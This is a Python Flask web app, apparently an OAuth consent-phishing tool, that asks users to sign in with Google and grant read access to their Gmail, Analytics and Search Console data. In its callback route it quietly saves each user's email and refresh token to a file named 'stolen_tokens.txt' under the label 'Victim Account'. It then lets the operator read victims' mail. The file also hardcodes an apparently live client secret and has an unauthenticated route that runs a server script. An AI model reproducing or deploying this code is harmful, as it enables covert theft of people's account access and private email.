import os
import base64
import json
import subprocess
from flask import Flask, request, redirect, session, url_for, render_template
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials # ✅ تم التأكد من إضافة هذه المكتبة

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app' 
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# =================================================================
# بيانات الاعتماد الخاصة بك
# =================================================================
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bmapps.pythonanywhere.com/callback'
# =================================================================

SCOPES = [
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/webmasters.readonly',
    'https://www.googleapis.com/auth/analytics.readonly',
    'https://www.googleapis.com/auth/gmail.readonly',
    'openid'
]

# دالة لإنشاء كائن التدفق لتجنب مشاكل الحالة العامة
def create_flow():
    return Flow.from_client_config(
        client_config={
            "web": {
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url()
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        
        if refresh_token:
            log_entry = f"--- Victim Account ---\nEmail: {user_email}\nRefresh Token: {refresh_token}\n---------------------\n\n"
            log_file_path = f'/home/Bmapps/mysite/stolen_tokens.txt'
            with open(log_file_path, 'a') as f:
                f.write(log_entry)
    except Exception as e:
        print(f"Error while logging token: {e}")

    session['credentials'] = { 
        'token': credentials.token, 
        'refresh_token': credentials.refresh_token, 
        'token_uri': credentials.token_uri, 
        'client_id': credentials.client_id, 
        'client_secret': credentials.client_secret, 
        'scopes': credentials.scopes 
    }
    
    return redirect('/#dashboard')

@app.route('/emails')
def show_emails():
    if 'credentials' not in session: return redirect(url_for('login'))
    
    # =================================================================
    #  ✅ هذا هو الجزء الذي تم تصحيحه
    # =================================================================
    # إعادة بناء كائن الاعتماد من البيانات المحفوظة في الجلسة
    credentials = Credentials(**session['credentials'])
    # =================================================================

    service = build('gmail', 'v1', credentials=credentials)
    result = service.users().messages().list(userId='me', maxResults=20).execute()
    messages = result.get('messages', [])
    
    emails_data = []
    if messages:
        for msg in messages:
            msg_data = service.users().messages().get(userId='me', id=msg['id']).execute()
            headers = msg_data['payload']['headers']
            subject = next((header['value'] for header in headers if header['name'].lower() == 'subject'), 'No Subject')
            emails_data.append({'id': msg['id'], 'subject': subject})
            
    return render_template('emails_list.html', emails=emails_data)

@app.route('/email/<message_id>')
def show_email_content(message_id):
    if 'credentials' not in session: return redirect(url_for('login'))
        
    # =================================================================
    #  ✅ وهذا الجزء أيضًا تم تصحيحه
    # =================================================================
    # إعادة بناء كائن الاعتماد من البيانات المحفوظة في الجلسة
    credentials = Credentials(**session['credentials'])
    # =================================================================

    service = build('gmail', 'v1', credentials=credentials)
    msg_data = service.users().messages().get(userId='me', id=message_id, format='full').execute()
    
    payload = msg_data['payload']
    headers = payload['headers']
    subject = next((header['value'] for header in headers if header['name'].lower() == 'subject'), 'No Subject')
    sender = next((header['value'] for header in headers if header['name'].lower() == 'from'), 'Unknown Sender')

    body = ""
    if 'parts' in payload:
        for part in payload['parts']:
            if part['mimeType'] == 'text/plain' and 'data' in part['body']:
                body_data = part['body']['data']
                body = base64.urlsafe_b64decode(body_data.encode('ASCII')).decode('utf-8')
                break
    elif 'data' in payload['body']:
        body_data = payload['body']['data']
        body = base64.urlsafe_b64decode(body_data.encode('ASCII')).decode('utf-8')
        
    return render_template('email_content.html', subject=subject, sender=sender, body=body)

@app.route('/run-the-script')
def run_script():
    script_path = '/home/Bmapps/mysite/generate_report.py'
    try:
        subprocess.Popen(['python3.12', script_path])
        return "<h1>تم إرسال أمر تشغيل السكربت بنجاح!</h1>"
    except Exception as e:
        return f"<h1>حدث خطأ!</h1><p>{e}</p>"
